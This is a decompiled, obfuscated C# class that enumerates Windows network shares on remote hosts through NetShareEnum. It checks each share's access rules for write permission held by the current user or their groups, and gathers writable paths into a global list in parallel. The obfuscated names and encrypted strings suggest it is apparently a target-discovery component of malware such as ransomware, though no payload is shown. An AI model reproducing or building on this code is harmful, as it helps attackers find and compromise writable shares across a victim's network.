using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

internal sealed class cDbxevGKyerYDuSO
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct XqHClniUJlL
	{
		public string LkbpkwnzNCc;

		public uint BVBLbPlRQRSrJ;

		public string JMqGXdxOaI;

		public XqHClniUJlL(string string_0, uint uint_0, string string_1)
		{
			LkbpkwnzNCc = string_0;
			BVBLbPlRQRSrJ = uint_0;
			JMqGXdxOaI = string_1;
		}

		public override string ToString()
		{
			return LkbpkwnzNCc;
		}
	}

	private sealed class FFKroxTRAJiI
	{
		public HkJcjpzBEEOnh.NEKyzGsocBv MNPvRCXpKatpZ;
	}

	private sealed class XkPscykpFOy
	{
		public FFKroxTRAJiI oNjqDWfSYjXf;

		public string uijQjuoXXvrpIiy;

		public void _003CGetAllShares_003Eb__1()
		{
			yaRzgSbCCki(uijQjuoXXvrpIiy, oNjqDWfSYjXf.MNPvRCXpKatpZ);
		}
	}

	public static ReaderWriterLockSlim BlZPnNQBwuwib;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static XqHClniUJlL[] LjwVcGalRKeorh(string string_0)
	{
		List<XqHClniUJlL> list = new List<XqHClniUJlL>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(XqHClniUJlL));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				XqHClniUJlL item = (XqHClniUJlL)Marshal.PtrToStructure(ptr, typeof(XqHClniUJlL));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new XqHClniUJlL(getString_0(107376538) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	public static void yaRzgSbCCki(string string_0, HkJcjpzBEEOnh.NEKyzGsocBv nekyzGsocBv_0)
	{
		string[] source = new string[2]
		{
			getString_0(107376529),
			getString_0(107376548)
		};
		XqHClniUJlL[] array = LjwVcGalRKeorh(string_0);
		if (array.Length > 0)
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>();
			List<string> list3 = new List<string>();
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			string value = current.User!.Value;
			XqHClniUJlL[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				XqHClniUJlL xqHClniUJlL = array2[i];
				if (nekyzGsocBv_0.PestXWGbVnp != null && nekyzGsocBv_0.PestXWGbVnp.Contains(xqHClniUJlL.LkbpkwnzNCc.ToString().ToUpper()))
				{
					continue;
				}
				try
				{
					string text = string.Format(getString_0(107376503), string_0, xqHClniUJlL.LkbpkwnzNCc);
					Directory.GetFiles(text);
					list.Add(xqHClniUJlL.LkbpkwnzNCc);
					AuthorizationRuleCollection accessRules = Directory.GetAccessControl(text).GetAccessRules(includeExplicit: true, includeInherited: true, typeof(SecurityIdentifier));
					foreach (FileSystemAccessRule item in accessRules)
					{
						if ((item.IdentityReference.ToString() == value || current.Groups!.Contains(item.IdentityReference)) && item.FileSystemRights.HasFlag(FileSystemRights.Write) && item.AccessControlType == AccessControlType.Allow)
						{
							if (!ACJZwXMCdgNnIA.eaZULefnOUcJVI.Contains(text))
							{
								ACJZwXMCdgNnIA.eaZULefnOUcJVI.Add(text);
							}
							list2.Add(xqHClniUJlL.LkbpkwnzNCc);
							break;
						}
					}
				}
				catch
				{
					if (!source.Contains(xqHClniUJlL.LkbpkwnzNCc))
					{
						list3.Add(xqHClniUJlL.LkbpkwnzNCc);
					}
				}
			}
		}
		QdaOlYunPLncO.NcFBLwLFwP++;
	}

	public static void oQvtbTvsZenhfkRR(List<string> list_0, HkJcjpzBEEOnh.NEKyzGsocBv nekyzGsocBv_0)
	{
		FFKroxTRAJiI fFKroxTRAJiI = new FFKroxTRAJiI();
		fFKroxTRAJiI.MNPvRCXpKatpZ = nekyzGsocBv_0;
		List<Action> list = new List<Action>();
		using (List<string>.Enumerator enumerator = list_0.GetEnumerator())
		{
			while (enumerator.MoveNext())
			{
				Action action = null;
				XkPscykpFOy CS_0024_003C_003E8__locals0 = new XkPscykpFOy();
				CS_0024_003C_003E8__locals0.oNjqDWfSYjXf = fFKroxTRAJiI;
				CS_0024_003C_003E8__locals0.uijQjuoXXvrpIiy = enumerator.Current;
				action = delegate
				{
					yaRzgSbCCki(CS_0024_003C_003E8__locals0.uijQjuoXXvrpIiy, CS_0024_003C_003E8__locals0.oNjqDWfSYjXf.MNPvRCXpKatpZ);
				};
				list.Add(action);
			}
		}
		ParallelOptions parallelOptions = new ParallelOptions();
		parallelOptions.MaxDegreeOfParallelism = fFKroxTRAJiI.MNPvRCXpKatpZ.NDzgRiqaaBg;
		ParallelOptions parallelOptions2 = parallelOptions;
		Parallel.Invoke(parallelOptions2, list.ToArray());
	}

	static cDbxevGKyerYDuSO()
	{
		Strings.CreateGetStringDelegate(typeof(cDbxevGKyerYDuSO));
		BlZPnNQBwuwib = new ReaderWriterLockSlim();
	}
}
